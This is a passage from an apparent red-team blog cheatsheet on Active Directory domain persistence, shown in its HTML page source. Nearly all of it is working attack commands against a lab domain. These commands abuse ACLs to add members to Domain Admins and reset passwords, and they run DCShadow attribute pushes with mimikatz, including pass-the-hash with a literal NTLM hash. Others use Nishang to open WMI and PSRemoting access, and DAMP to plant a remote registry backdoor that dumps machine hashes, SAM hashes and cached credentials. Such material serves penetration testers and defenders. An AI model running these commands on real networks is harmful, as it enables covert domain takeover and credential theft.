</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-Acl</span> <span class=n>-Path</span> <span class=s2>&#34;AD:\CN=Domain Admins,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&#34;</span><span class=p>).</span><span class=py>Access</span> <span class=p>|</span> <span class=p>?{</span><span class=nv>$_</span><span class=p>.</span><span class=py>IdentityReference</span> <span class=o>-like</span> <span class=s2>&#34;CYBERLAB\STUDENT1&#34;</span><span class=p>}</span>
</span></span></code></pre></div></li><li><p>Once you have the requested permissions on desired objects, it is possible to abuse FullControl/WriteMember (running as the user previousely added) to add new users to the Domain Admins group:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView_dev</span>
</span></span><span class=line><span class=cl><span class=nb>Add-DomainGroupMember</span> <span class=n>-Identity</span> <span class=s2>&#34;Domain Admins&#34;</span> <span class=n>-Members</span> <span class=s2>&#34;TESTDA&#34;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Add-ADGroupMember</span> <span class=n>-Identity</span> <span class=s2>&#34;Domain Admins&#34;</span> <span class=n>-Members</span> <span class=s2>&#34;TESTDA&#34;</span>
</span></span></code></pre></div><p>or perform ResetPassword (running as the user previousely added):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerView_dev</span>
</span></span><span class=line><span class=cl><span class=nb>Set-DomainUserPassword</span> <span class=n>-Identity</span> <span class=s2>&#34;TESTDA&#34;</span> <span class=n>-AccountPassword</span> <span class=p>(</span><span class=nb>ConvertTo-SecureString</span> <span class=s2>&#34;Password@123&#34;</span> <span class=n>-AsPlainText</span> <span class=n>Force</span> <span class=n>-Force</span><span class=p>)</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># ActiveDirectory Module</span>
</span></span><span class=line><span class=cl><span class=nb>Set-ADAccountPassword</span> <span class=n>-Identity</span> <span class=s2>&#34;TESTDA&#34;</span> <span class=n>-NewPassword</span> <span class=p>(</span><span class=nb>ConvertTo-SecureString</span> <span class=s2>&#34;Password@123&#34;</span> <span class=n>-AsPlainText</span> <span class=n>Force</span> <span class=n>-Force</span><span class=p>)</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li></ol><h2 id=dcshadow>DCShadow</h2><ol><li><p>Start a mimikatz session as SYSTEM and run the below commands to modify an attribute (in this case the SPN is set to “Replication/DC”:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>:: mimikatz.exe
</span></span><span class=line><span class=cl>mimikatz # lsadump::dcshadow /object:STUDENT2 /attribute:servicePrincipalName /value:&#34;Replication/DC&#34;
</span></span></code></pre></div></li><li><p>Then from mimikatz impersonate a Domain Admin and push the attributes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>:: mimikatz.exe
</span></span><span class=line><span class=cl>mimikatz # privilege::debug
</span></span><span class=line><span class=cl>mimikatz # token::elevate
</span></span><span class=line><span class=cl>mimikatz # sekurlsa::pth /user:Administrator /domain:cybercorp.local /ntlm:78603c228a04497e15e870688ea2e02d /impersonate
</span></span><span class=line><span class=cl>mimikatz # lsadump::dcshadow /push
</span></span></code></pre></div><p>If we would like to do the above without using DA, the only thing that changes is the “push”. Instead of running mimikatz as DA to push the attributes, we can use SetDCShadowPermissions to provide minimal rights to a user (STUDENT1) in order to change attributes to another user (STUDENT2). Keep in mind that, for once, we will still need to have DA privileges.</p></li><li><p>Run the below command from a PowerShell session running as DA:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Set-DCShadowPermissions</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Set-DCShadowPermissions</span> <span class=n>-FakeDC</span> <span class=s2>&#34;fake-dc&#34;</span> <span class=n>-SamAccountName</span> <span class=s2>&#34;STUDENT2&#34;</span> <span class=n>-Username</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>Then as STUDENT1 run mimikatz and push the attributes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>:: mimikatz.exe
</span></span><span class=line><span class=cl>mimikatz # lsadump::dcshadow /push
</span></span></code></pre></div></li><li><p>In order to remove the just provided permissions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Set-DCShadowPermissions</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Set-DCShadowPermissions</span> <span class=n>-FakeDC</span> <span class=s2>&#34;fake-dc&#34;</span> <span class=n>-SamAccountName</span> <span class=s2>&#34;STUDENT2&#34;</span> <span class=n>-Username</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Verbose</span> <span class=n>-Remove</span>
</span></span></code></pre></div></li></ol><h2 id=windows-management-instrumentation-wmi>Windows Management Instrumentation (WMI)</h2><p>ACLs can be modified to allow non-admin users access to securable objects.</p><p>Allow access permission on local machine for STUDENT1 user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-namespace</span> <span class=s2>&#34;root\cimv2&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Allow access permission on a remote machine for STUDENT1 without explicit credentials</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;DC&#34;</span> <span class=n>-namespace</span> <span class=s2>&#34;root\cimv2&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Allow access permission on a remote machine with explicit credentials. Only root2 and nested namespaces:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;Administrator&#34;</span> <span class=n>-namespace</span> <span class=s2>&#34;root\cimv2&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Remove access permission on a remote machine remove permissions :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc&#34;</span> <span class=n>-namespace</span> <span class=s2>&#34;root\cimv2&#34;</span> <span class=n>-Remove</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><h2 id=powershell-remoting>PowerShell Remoting</h2><p>Allow PSRemoting access permission on local machine for STUDENT1:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemotePSRemoting</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Allow PSRemoting access permission on a remote machine for STUDENT1 without credentials:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemotePSRemoting</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Remove PSRemoting access permission on a remote machine for STUDENT1:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemotePSRemoting</span> <span class=n>-UserName</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc&#34;</span> <span class=n>-Remove</span>
</span></span></code></pre></div><h2 id=remote-registry>Remote Registry</h2><p>Using DAMP, with admin privileges on a remote machine, it is possible to implement a new remote registry backdoor that allows for the remote retrieval of a system"s machine and local account hashes, as well as its domain cached credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># DAMP</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Add-RemoteRegBackdoor</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Add-RemoteRegBackdoor</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc&#34;</span> <span class=n>-Trustee</span> <span class=s2>&#34;STUDENT1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>As STUDENT1, abuse the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve:</p><ol><li><p>The machine account hash for the specified machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># DAMP</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>RemoteHashRetrieval</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-RemoteMachineAccountHash</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>The local SAM account hashes for the specified machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># DAMP</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>RemoteHashRetrieval</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-RemoteLocalAccountHash</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>The domain cached credentials for the specified machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># DAMP</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>RemoteHashRetrieval</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-RemoteCachedCredential</span> <span class=n>-ComputerName</span> <span class=s2>&#34;cyberlab-dc&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li></ol><hr></div><div class=article-tags><a class="badge badge-light" href=/tag/red-teaming/>Red Teaming</a>
<a class="badge badge-light" href=/tag/windows/>Windows</a>
<a class="badge badge-light" href=/tag/active-directory/>Active Directory</a>
<a class="badge badge-light" href=/tag/persistence/>Persistence</a></div><div class=share-box><ul class=share><li><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0040-domain-persistence-cheatsheet%2F&text=Domain+Persistence+cheatsheet" target=_blank rel=noopener class=share-btn-twitter aria-label=twitter><i class="fab fa-twitter"></i></a></li><li><a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0040-domain-persistence-cheatsheet%2F&t=Domain+Persistence+cheatsheet" target=_blank rel=noopener class=share-btn-facebook aria-label=facebook><i class="fab fa-facebook"></i></a></li><li><a href="mailto:?subject=Domain%20Persistence%20cheatsheet&body=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0040-domain-persistence-cheatsheet%2F" target=_blank rel=noopener class=share-btn-email aria-label=envelope><i class="fas fa-envelope"></i></a></li><li><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0040-domain-persistence-cheatsheet%2F&title=Domain+Persistence+cheatsheet" target=_blank rel=noopener class=share-btn-linkedin aria-label=linkedin-in><i class="fab fa-linkedin-in"></i></a></li><li><a href="whatsapp://send?text=Domain+Persistence+cheatsheet%20https%3A%2F%2Fwww.peco602.com%2Fpost%2F0040-domain-persistence-cheatsheet%2F" target=_blank rel=noopener class=share-btn-whatsapp aria-label=whatsapp><i class="fab fa-whatsapp"></i></a></li><li><a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0040-domain-persistence-cheatsheet%2F&title=Domain+Persistence+cheatsheet" target=_blank rel=noopener class=share-btn-weibo aria-label=weibo><i class="fab fa-weibo"></i></a></li></ul></div><div class="media author-card content-widget-hr"><a href=https://www.peco602.com/><img class="avatar mr-3 avatar-circle" src=/authors/admin/avatar_huf4f2a9d771509e6e0b947acc7d389632_627121_270x270_fill_q75_lanczos_center.jpg alt="Giovanni Pecoraro"></a><div class=media-body><h5 class=card-title><a href=https://www.peco602.com/>Giovanni Pecoraro</a></h5><h6 class=card-subtitle>Senior Security Engineer</h6><p class=card-text>My research interests include space systems, cyber security, signal processing and artificial intelligence.</p><ul class=network-icon aria-hidden=true><li><a href=/#contact><i class="fas fa-envelope"></i></a></li><li><a href=https://twitter.com/Peco602 target=_blank rel=noopener><i class="fab fa-twitter"></i></a></li><li><a href="https://scholar.google.com/citations?user=JSM2EcoAAAAJ" target=_blank rel=noopener><i class="ai ai-google-scholar"></i></a></li><li><a href=https://www.researchgate.net/profile/Giovanni-Pecoraro target=_blank rel=noopener><i class="fab fa-researchgate"></i></a></li><li><a href=https://github.com/Peco602 target=_blank rel=noopener><i class="fab fa-github"></i></a></li><li><a href=https://it.linkedin.com/in/giovanni-pecoraro-078500155 target=_blank rel=noopener><i class="fab fa-linkedin"></i></a></li><li><a href=/uploads/resume.pdf><i class="ai ai-cv"></i></a></li></ul></div></div><script src=https://utteranc.es/client.js repo=Peco602/peco602.github.io issue-term=pathname label=comment theme=github-light crossorigin=anonymous async></script></div></article></div><div class=page-footer><div class=container><footer class=site-footer><p class="powered-by copyright-license-text">© 2023 Me. This work is licensed under <a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank>CC BY NC ND 4.0</a></p><p class="powered-by footer-license-icons"><a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank aria-label="Creative Commons"><i class="fab fa-creative-commons fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-by fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nc fa-2x" aria-hidden=true></i>
<i class="fab fa-creative-commons-nd fa-2x" aria-hidden=true></i></a></p><p class=powered-by>Published with <a href="https://wowchemy.com/?utm_campaign=poweredby" target=_blank rel=noopener>Wowchemy</a> — the free, <a href=https://github.com/wowchemy/wowchemy-hugo-themes target=_blank rel=noopener>open source</a> website builder that empowers creators.</p></footer></div></div><script src=/js/vendor-bundle.min.d26509351aa0ff874abbee824e982e9b.js></script>
<script id=search-hit-fuse-template type=text/x-template>
    <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
    </div>
  </script><script src=https://cdn.jsdelivr.net/gh/krisk/Fuse@v3.2.1/dist/fuse.min.js integrity="sha512-o38bmzBGX+hD3JHWUFCDA09btWaqrNmoJ3RXLlrysA7PP01Kgs4UlE4MhelE1v5dJR3+cxlR4qQlotsW7jKsnw==" crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/gh/julmot/mark.js@8.11.1/dist/jquery.mark.min.js integrity="sha512-mhbv5DqBMgrWL+32MmsDOt/OAvqr/cHimk6B8y/bx/xS88MVkYGPiVv2ixKVrkywF2qHplNRUvFsAHUdxZ3Krg==" crossorigin=anonymous></script>
<script id=page-data type=application/json>{"use_headroom":true}</script><script src=/js/wowchemy-headroom.db4755770454eb63685f8de785c0a172.js type=module></script>
<script src=/en/js/wowchemy.min.e8ee06ba8371980ffde659871dd593b0.js></script><div id=modal class="modal fade" role=dialog><div class=modal-dialog><div class=modal-content><div class=modal-header><h5 class=modal-title>Cite</h5><button type=button class=close data-dismiss=modal aria-label=Close>
<span aria-hidden=true>&#215;</span></button></div><div class=modal-body><pre><code></code></pre></div><div class=modal-footer><a class="btn btn-outline-primary my-1 js-copy-cite" href=# target=_blank><i class="fas fa-copy"></i> Copy</a>
<a class="btn btn-outline-primary my-1 js-download-cite" href=# target=_blank><i class="fas fa-download"></i> Download</a><div id=modal-error></div></div></div></div></div><script src=/js/wowchemy-publication.68f8d7090562ca65fc6d3cb3f8f2d2cb.js type=module></script></body></html>